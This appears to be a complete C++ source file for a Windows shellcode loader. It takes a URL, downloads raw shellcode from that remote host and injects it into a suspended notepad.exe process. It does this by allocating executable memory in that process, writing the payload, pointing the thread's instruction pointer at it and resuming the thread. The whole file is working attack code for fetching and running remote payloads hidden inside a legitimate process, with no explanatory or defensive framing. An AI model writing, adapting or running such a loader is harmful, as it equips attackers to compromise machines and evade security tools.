#include <windows.h>
#include <wininet.h>
#include <iostream>

#pragma comment(lib, "wininet.lib")

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <url_to_shellcode>" << std::endl;
        return 1;
    }

    const char* url = argv[1];

    // Step 1: Download shellcode from URL
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        std::cerr << "[-] InternetOpenA failed\n";
        return 1;
    }

    HINTERNET hFile = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        std::cerr << "[-] InternetOpenUrlA failed\n";
        InternetCloseHandle(hInternet);
        return 1;
    }

    char sizeBuf[256] = {};
    DWORD sizeLen = sizeof(sizeBuf);
    DWORD fileSize = 0;
    if (HttpQueryInfoA(hFile, HTTP_QUERY_CONTENT_LENGTH, sizeBuf, &sizeLen, 0)) {
        fileSize = atoi(sizeBuf);
    } else {
        std::cerr << "[-] Failed to get content length\n";
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return 1;
    }

    BYTE* shellcode = new BYTE[fileSize];
    DWORD bytesRead = 0;
    if (!InternetReadFile(hFile, shellcode, fileSize, &bytesRead) || bytesRead != fileSize) {
        std::cerr << "[-] Download failed or incomplete\n";
        delete[] shellcode;
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return 1;
    }

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);
    std::cout << "[+] Downloaded " << bytesRead << " bytes of shellcode\n";

    // Step 2: Create suspended process
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    const char* target = "C:\\Windows\\System32\\notepad.exe";

    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::cerr << "[-] Failed to create suspended process\n";
        delete[] shellcode;
        return 1;
    }

    std::cout << "[+] Suspended process created (PID: " << pi.dwProcessId << ")\n";

    // Step 3: Allocate memory in remote process
    LPVOID remoteAddr = VirtualAllocEx(pi.hProcess, NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteAddr) {
        std::cerr << "[-] VirtualAllocEx failed\n";
        TerminateProcess(pi.hProcess, 1);
        delete[] shellcode;
        return 1;
    }

    // Step 4: Write shellcode into remote process memory
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remoteAddr, shellcode, fileSize, &written) || written != fileSize) {
        std::cerr << "[-] WriteProcessMemory failed\n";
        TerminateProcess(pi.hProcess, 1);
        delete[] shellcode;
        return 1;
    }

    // Step 5: Set thread context to shellcode
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "[-] GetThreadContext failed\n";
        TerminateProcess(pi.hProcess, 1);
        delete[] shellcode;
        return 1;
    }

#ifdef _WIN64
    ctx.Rip = (DWORD64)remoteAddr;
#else
    ctx.Eip = (DWORD)remoteAddr;
#endif

    if (!SetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "[-] SetThreadContext failed\n";
        TerminateProcess(pi.hProcess, 1);
        delete[] shellcode;
        return 1;
    }

    std::cout << "[+] Shellcode written. Resuming thread...\n";

    // Step 6: Resume thread
    ResumeThread(pi.hThread);

    // Cleanup
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    delete[] shellcode;

    return 0;
}
